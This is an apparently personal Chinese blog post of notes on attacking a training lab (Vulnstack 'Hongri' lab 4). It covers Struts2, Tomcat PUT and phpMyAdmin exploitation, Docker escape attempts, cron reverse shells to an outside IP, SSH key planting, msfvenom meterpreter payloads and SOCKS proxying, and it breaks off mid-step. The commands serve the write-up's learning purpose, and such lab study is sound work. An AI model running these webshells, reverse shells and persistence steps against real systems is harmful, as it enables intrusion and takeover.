<!DOCTYPE html>

<html lang="zh-CN">

<head>
    
    <title>çº¢æ—¥é¶åœº(å››)ç¬”è®° - M1N&#39;s Blog</title>
    <meta charset="UTF-8">
    <meta name="keywords" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    

    <link rel="shortcut icon" href="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png" />
    <meta name="description" content="çº¢æ—¥é¶åœºå››å­¦ä¹ è®°å½•">
<meta property="og:type" content="article">
<meta property="og:title" content="çº¢æ—¥é¶åœº(å››)ç¬”è®°">
<meta property="og:url" content="http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="M1N&#39;s Blog">
<meta property="og:description" content="çº¢æ—¥é¶åœºå››å­¦ä¹ è®°å½•">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041548215.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549039.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549704.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549079.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549213.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549823.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550718.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550478.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550982.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550669.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550909.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550025.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550134.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550189.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550638.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550887.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550717.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550550.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550855.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551462.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551829.png">
<meta property="article:published_time" content="2021-11-16T14:22:21.000Z">
<meta property="article:modified_time" content="2022-01-04T07:58:28.813Z">
<meta property="article:author" content="M1N">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
    <link rel="stylesheet" href="/css/style.css?v=1641283248152">
     
    
    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1641283248152">
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="mdui-drawer-body-left">
    
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="M1N" class="mdui-btn mdui-btn-icon"><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" alt="M1N"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="M1N">
            <img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" alt="M1N" alt="M1N">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>æ–‡ç« </span>1</div>
        <div><span>æ ‡ç­¾</span>0</div>
        <div><span>åˆ†ç±»</span>1</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="å›åˆ°é¦–é¡µ">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                å›åˆ°é¦–é¡µ
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=site:m1n.me" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="æœç´¢"></label>
            </form>
         
    </div>
</div>
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://github.com/m1nme/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
    
    
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">æ–‡ç« åˆ†ç±»</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Writeup/">Writeup</a>
          <span class="category-list-count">1</span>
        </li>

        
      </ul>

    </div>
  </div>


    
    
    
</aside>
    <div class="nexmoe-copyright">
        &copy; 2022 M1N
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <div class="nexmoe-post">

  <article>
      
          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
              <img data-src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/6.jpg" data-sizes="auto" alt="çº¢æ—¥é¶åœº(å››)ç¬”è®°" class="lazyload">
              <h1>çº¢æ—¥é¶åœº(å››)ç¬”è®°</h1>
          </div>
      
      
      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
    <a><i class="nexmoefont icon-calendar-fill"></i>2021å¹´11æœˆ16æ—¥</a>
    <a><i class="nexmoefont icon-areachart"></i>2k å­—</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>å¤§æ¦‚ 9 åˆ†é’Ÿ</a>
</div>

      

      <p>çº¢æ—¥é¶åœºå››å­¦ä¹ è®°å½•</p>
<span id="more"></span>
<h2 id="å‰è¨€"><a class="markdownIt-Anchor" href="#å‰è¨€">#</a> å‰è¨€</h2>
<p>å› ä¸ºåšçš„è¿‡ç¨‹ä¸­ï¼Œæ—¶é—´è·¨åº¦æ¯”è¾ƒå¤§ï¼Œå‰åŠæ®µæ˜¯æ‰“çš„å…¬å¸çš„é¶åœºï¼ŒååŠæ®µè‡ªå·±æ­å»ºé¶åœºï¼Œæ•… IP æœ‰æ‰€å˜åŠ¨ã€‚æ‹“æ‰‘å¦‚ä¸‹ï¼š<br>
<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png" alt="13" class="lazyload"></p>
<p>Ubuntu ç”¨ Docker è·‘äº†ä¸‰ä¸ª Web æœåŠ¡ï¼Œä¸€å° Win7 åŸŸæˆå‘˜æœºï¼Œä¸€å° Winserver2008 åŸŸæ§</p>
<h2 id="å¤–ç½‘æ‰“ç‚¹"><a class="markdownIt-Anchor" href="#å¤–ç½‘æ‰“ç‚¹">#</a> å¤–ç½‘æ‰“ç‚¹</h2>
<h3 id="2001ç«¯å£struct2"><a class="markdownIt-Anchor" href="#2001ç«¯å£struct2">#</a> 2001 ç«¯å£ Struct2</h3>
<p>Burp æŠ“åŒ…çœ‹åˆ° Struct2 å­—æ ·ï¼Œç›´æ¥å·¥å…·æµ‹è¯•ä¸€æŠŠæ¢­</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png" alt="" class="lazyload"></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png" alt="" class="lazyload"></p>
<h3 id="2002ç«¯å£tomcat"><a class="markdownIt-Anchor" href="#2002ç«¯å£tomcat">#</a> 2002 ç«¯å£ Tomcat</h3>
<p>å¯ä»¥å‚è€ƒ https://www.freebuf.com/articles/web/271892.html</p>
<p>ä½¿ç”¨ PUT ä¸Šä¼ å†°èé©¬ï¼Œæ³¨æ„ç›´æ¥ä¸Šä¼  <code>/shell.jsp</code>  ä¸è¡Œå“¦</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png" alt="" class="lazyload"></p>
<h3 id="2003ç«¯å£phpmyadmin-481"><a class="markdownIt-Anchor" href="#2003ç«¯å£phpmyadmin-481">#</a> 2003 ç«¯å£ phpMyAdmin 4.8.1</h3>
<p>å¯ä»¥å‚è€ƒ https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</p>
<ol>
<li>
<p>éªŒè¯æ¼æ´æ˜¯å¦å­˜åœ¨</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png" alt="" class="lazyload"></p>
</li>
<li>
<p>ä½¿ç”¨ SELECT è¯­å¥ååŒ…å« session æ–‡ä»¶æ¥ get shellï¼Œå†™ shell <code>SELECT &quot;&lt;?php phpinfo();file_put_contents('m1n.php', '&lt;?=@eval($_POST[1]);');?&gt;&quot;  </code> ï¼Œè®¿é—®å‘ç° <code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>  å‡ºç° phpinfoï¼Œç”¨èšå‰‘è¿æ¥ m1n.php å³å¯ã€‚</p>
</li>
</ol>
<h2 id="dockeré€ƒé€¸2002ç«¯å£çš„tomcat"><a class="markdownIt-Anchor" href="#dockeré€ƒé€¸2002ç«¯å£çš„tomcat">#</a> Docker é€ƒé€¸ï¼ˆ2002 ç«¯å£çš„ Tomcatï¼‰</h2>
<h3 id="å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockeré‡Œ"><a class="markdownIt-Anchor" href="#å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨dockeré‡Œ">#</a> å¦‚ä½•åˆ¤æ–­æ˜¯å¦åœ¨ Docker é‡Œ</h3>
<ul>
<li>æ£€æŸ¥  <code>/.dockerenv</code>  æ–‡ä»¶æ˜¯å¦å­˜åœ¨</li>
<li>æ£€æŸ¥  <code>/proc/1/cgroup</code>  å†…æ˜¯å¦åŒ…å« Docker ç­‰å­—ç¬¦ä¸²</li>
</ul>
<h3 id="å°è¯•dirtycowæ¼æ´é€ƒé€¸"><a class="markdownIt-Anchor" href="#å°è¯•dirtycowæ¼æ´é€ƒé€¸">#</a> å°è¯• DirtyCow æ¼æ´é€ƒé€¸</h3>
<ol>
<li>
<p>ä¸‹è½½ POCï¼š<a target="_blank" rel="noopener" href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></p>
</li>
<li>
<p>ç¼–è¯‘ï¼Œä¸Šä¼ ï¼Œç›‘å¬ï¼Œè¿è¡Œï¼Œæ²¡ååº”ï¼Œä¸‹ä¸€ä¸ªã€‚</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/scumjr/</span>dirtycow-vdso.git<br>cd dirtycow-vdso<br>make<br>./<span class="hljs-number">0</span>xdeadbeef ip:port<br></code></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="å°è¯•runcå®¹å™¨é€ƒé€¸æ¼æ´cve-2019-5736"><a class="markdownIt-Anchor" href="#å°è¯•runcå®¹å™¨é€ƒé€¸æ¼æ´cve-2019-5736">#</a> å°è¯• runC å®¹å™¨é€ƒé€¸æ¼æ´ï¼ˆCVE-2019-5736ï¼‰</h3>
<ol>
<li>ä¸‹è½½ POCï¼š<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
<li>æ”¹ POCï¼ŒæŠŠ payload é‚£è¡Œæ”¹æˆè‡ªå·± VPS çš„ IP</li>
<li>ç¼–è¯‘ï¼ˆå»ºè®® Linux ç¯å¢ƒä¸‹ï¼‰ <code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>
<li>ä¸Šä¼ æ–‡ä»¶ï¼Œç›‘å¬ç«¯å£ï¼Œæ‰§è¡Œï¼Œæ²¡ååº”ï¼Œä¸‹ä¸€ä¸ªã€‚</li>
</ol>
<h3 id="å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸"><a class="markdownIt-Anchor" href="#å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸">#</a> å°è¯•ç‰¹æƒæ¨¡å¼é€ƒé€¸</h3>
<ol>
<li><code>fdisk -l</code>  æŸ¥çœ‹ç£ç›˜</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png" alt="" class="lazyload"></p>
<ol start="2">
<li>
<p>åœ¨æ ¹ç›®å½•ä¸‹åˆ›å»ºæ–‡ä»¶å¤¹ï¼ŒæŠŠ /dev/sda1 æŒ‚åœ¨åˆ°è¯¥æ–‡ä»¶å¤¹</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> /m<span class="hljs-number">1</span>n<br><span class="hljs-attribute">mount</span> /dev/sda<span class="hljs-number">1</span> /m<span class="hljs-number">1</span>n<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>å¯ä»¥çœ‹åˆ°å®¿ä¸»æœºçš„æ–‡ä»¶éƒ½åˆ°äº† /m1n ç›®å½•ä¸‹</p>
</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041548215.png" alt="image-20210816152534150" class="lazyload"></p>
<h4 id="å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell"><a class="markdownIt-Anchor" href="#å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹shell">#</a> å°è¯•å†™å®šæ—¶ä»»åŠ¡æ¥åå¼¹ shell</h4>
<p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18 / è§£å†³ ubuntu-crontab åå¼¹ shell å¤±è´¥çš„é—®é¢˜ /</a></p>
<ol>
<li>å†™æ–‡ä»¶åˆ° <code>/var/spool/cron/crontabs/root</code> ï¼Œæ³¨æ„å†™åˆ° <code>/var/spool/cron/root</code>  ä¸è¡Œå—·</li>
<li>åŒæ—¶æ³¨æ„ root æ–‡ä»¶çš„æƒé™å¿…é¡»ä¸º 600</li>
<li>æ³¨æ„å®šæ—¶ä»»åŠ¡æ–‡ä»¶å†…å®¹ä¸­ï¼Œè·¯å¾„è¦ç”¨ç»å¯¹è·¯å¾„ï¼Œå»ºè®®æŠŠå‘½ä»¤å†™æˆ <code>.sh</code>  æ–‡ä»¶ï¼Œç„¶å <code>chmod +x</code> ï¼Œç„¶åè°ƒç”¨ï¼Œä¸å®¹æ˜“å‡ºé”™</li>
<li>ä¹Ÿå¯ä»¥ <code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>
<li>åœ¨æœ¬åœ°çš„ Ubuntu20 è™šæ‹Ÿæœºä¸­æˆåŠŸåå¼¹ shellï¼Œä½†æ˜¯é¶åœºç¯å¢ƒä¸‹æ²¡æ³•æˆåŠŸï¼Œå†™å…¥äº†å®šæ—¶ä»»åŠ¡å¿…é¡» restart æ‰å¯ä»¥æ‰§è¡Œï¼Œå¦åˆ™ä¸æ‰§è¡Œï¼Œæ— å¥ˆã€‚</li>
</ol>
<p><strong>å®šæ—¶ä»»åŠ¡ç›¸å…³ç¬”è®°ï¼š</strong></p>
<ol>
<li>
<p>å®šæ—¶ä»»åŠ¡æœ‰æ—¶æ— æ³•çœ‹åˆ°æŠ¥é”™ä¿¡æ¯ï¼Œå¯ä»¥è¿™æ ·è·å–æŠ¥é”™ä¿¡æ¯</p>
<p><code>\* * * * * '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'&gt;/tmp/error.txt 2&gt;&amp;1</code></p>
</li>
<li>
<p>å®šæ—¶ä»»åŠ¡æŸ¥çœ‹æ—¥å¿—ï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangshengxiang/p/11842326.html">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>
<p>ï¼ˆ1ï¼‰æŸ¥çœ‹ç³»ç»Ÿæ—¥å¿—ç›´æ¥ï¼š <code>tail -f /var/log/syslog</code></p>
<p>ï¼ˆ2ï¼‰æŸ¥çœ‹ crontab æ—¥å¿—ï¼š</p>
<p>â€‹	æ–¹æ³• 1</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. ä¿®æ”¹rsyslogæ–‡ä»¶ï¼Œå°†<span class="hljs-regexp">/etc/</span>rsyslog.d/<span class="hljs-number">50</span>-default.conf æ–‡ä»¶ä¸­çš„<span class="hljs-comment">#cron.*å‰çš„#åˆ æ‰ï¼›</span><br><span class="hljs-number">2</span>. é‡å¯rsyslogæœåŠ¡service rsyslog restart<br><span class="hljs-number">3</span>. é‡å¯cronæœåŠ¡service cron restart<br></code></pre></td></tr></table></figure>
<p>â€‹	æ–¹æ³• 2</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. ç¼–è¾‘ <span class="hljs-regexp">/etc/</span>syslog.confï¼Œå¹¶ä¸”æ‰“å¼€ä»¥cron.*å¼€å§‹çš„é‚£è¡Œæ³¨é‡Šã€‚<br><span class="hljs-number">2</span>. è¿è¡Œ <span class="hljs-regexp">/etc/i</span>nit.d/sysklogd restart<br><span class="hljs-number">3</span>. è¿è¡Œ <span class="hljs-regexp">/etc/i</span>nit.d/cron restart<br></code></pre></td></tr></table></figure>
<p>â€‹	æŸ¥çœ‹ cron æ—¥å¿—</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. linux<br>çœ‹ <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/cronè¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥ï¼Œå¯ä»¥ç”¨tail -f /</span>var<span class="hljs-regexp">/log/</span>cronè§‚å¯Ÿï¼ˆæˆ–è€…<span class="hljs-regexp">/var/</span>log/cron.logï¼‰<br><br><span class="hljs-number">2</span>. unix<br>åœ¨ <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>tmpæ–‡ä»¶ä¸­ï¼Œæœ‰croutXXX001864çš„tmpæ–‡ä»¶ï¼Œtail è¿™äº›æ–‡ä»¶å°±å¯ä»¥çœ‹åˆ°æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡äº†ã€‚<br><br><span class="hljs-number">3</span>. mailä»»åŠ¡<br>åœ¨ <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root æ–‡ä»¶ä¸­ï¼Œæœ‰crontabæ‰§è¡Œæ—¥å¿—çš„è®°å½•ï¼Œç”¨tail -f <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root å³å¯æŸ¥çœ‹æœ€è¿‘çš„crontabæ‰§è¡Œæƒ…å†µ<br></code></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="å°è¯•å†™sshå…¬é’¥æ¥è¿æ¥"><a class="markdownIt-Anchor" href="#å°è¯•å†™sshå…¬é’¥æ¥è¿æ¥">#</a> å°è¯•å†™.ssh å…¬é’¥æ¥è¿æ¥</h4>
<ol>
<li>
<p>æœ¬åœ°ç”Ÿæˆå…¬ç§é’¥</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span>-keygen -f m<span class="hljs-number">1</span>n<br><span class="hljs-attribute">chmod</span> <span class="hljs-number">600</span> m<span class="hljs-number">1</span>n<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>æŠŠ m1n.pub æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ <code>/root/.ssh/</code>  ç›®å½•ä¸‹ï¼ˆæ³¨æ„ï¼Œæ˜¯ /m1n ä¸‹çš„ /root/.sshï¼‰ï¼Œæ²¡æœ‰è¿™ä¸ªç›®å½•å°±åˆ›å»ºè¿™ä¸ªç›®å½•</p>
</li>
<li>
<p>æŠŠ m1n.pub çš„æ–‡ä»¶å†…å®¹å†™åˆ° authorized_keys æ–‡ä»¶ä¸­ <code>cat m1n.pub &gt; authorized_keys</code></p>
</li>
<li>
<p>ç„¶å <code>ssh -i m1n root@ip</code>  è¿æ¥ï¼Œå³å¯</p>
</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png" alt="" class="lazyload"></p>
<ol start="5">
<li>è¸©å‘ç¬”è®°ï¼šä¸è¦å†™å…¬é’¥åˆ° <code>/home/ubuntu/.ssh/</code>  ç›®å½•ä¸‹ï¼Œè¿ä¸ä¸Šã€‚</li>
</ol>
<h2 id="å†…ç½‘æ¸—é€"><a class="markdownIt-Anchor" href="#å†…ç½‘æ¸—é€">#</a> å†…ç½‘æ¸—é€</h2>
<h3 id="ä¼ "><a class="markdownIt-Anchor" href="#ä¼ ">#</a> ä¼ ğŸ</h3>
<h4 id="msf"><a class="markdownIt-Anchor" href="#msf">#</a> MSFğŸ</h4>
<ol>
<li>
<p>ç”Ÿæˆ msfğŸ</p>
<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &gt; mshell.elf</code></p>
</li>
<li>
<p>æŠŠğŸå„¿ä¼ åˆ°ç›®æ ‡æœºå­ä¸Šé¢</p>
</li>
<li>
<p>æ”»å‡»æœºæ‰§è¡Œä»¥ä¸‹</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> lhost 10.192.168.145<br><span class="hljs-builtin-name">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>ç›®æ ‡æœºå™¨æ·»åŠ æƒé™åæ‰§è¡Œ mshell.elf</p>
</li>
<li>
<p>kali æ¥æ”¶åˆ° shell</p>
</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png" alt="" class="lazyload"></p>
<ol start="5">
<li>
<p>msf æ‹¿åˆ° shell åï¼Œéœ€è¦å¯¼å…¥è·¯ç”±ï¼Œä½¿ç”¨ msf6 çš„è‡ªåŠ¨è·¯ç”±å¯¼å…¥</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">background<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/manage/autoroute<br><br><span class="hljs-keyword">set</span> session x<br><br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png" alt="" class="lazyload"></p>
</li>
</ol>
<h3 id="ä»£ç†è½¬å‘"><a class="markdownIt-Anchor" href="#ä»£ç†è½¬å‘">#</a> ä»£ç†è½¬å‘</h3>
<h4 id="ä½¿ç”¨ewä»£ç†è½¬å‘"><a class="markdownIt-Anchor" href="#ä½¿ç”¨ewä»£ç†è½¬å‘">#</a> ä½¿ç”¨ ew ä»£ç†è½¬å‘</h4>
<ol>
<li>ä¸Šä¼  ew_for_linux64</li>
<li>æ‰§è¡Œ <code>./ew -s ssocksd -l 8888</code></li>
<li>æ›´æ”¹ kali çš„ /etc/proxychains4.conf æ–‡ä»¶ï¼Œæ·»åŠ  socks5 ip prot</li>
